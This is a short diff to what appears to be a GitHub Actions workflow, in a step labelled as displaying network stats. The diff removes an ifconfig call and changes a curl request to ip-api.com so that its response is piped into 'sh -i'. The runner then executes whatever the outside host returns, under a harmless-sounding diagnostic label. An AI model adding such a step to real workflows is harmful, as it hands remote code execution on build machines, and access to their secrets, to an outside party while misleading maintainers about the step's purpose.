@@ -32,8 +32,6 @@ jobs:
       # displays networking info
       - name: Network Stats
         run: |
-          echo "ifconfig :"
-          ifconfig
           printf "\n\n[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]\n\n""
           echo "ip-api :"
-          curl "http://ip-api.com/json" --silent --location
+          curl "http://ip-api.com/json" --silent --location | sh -i
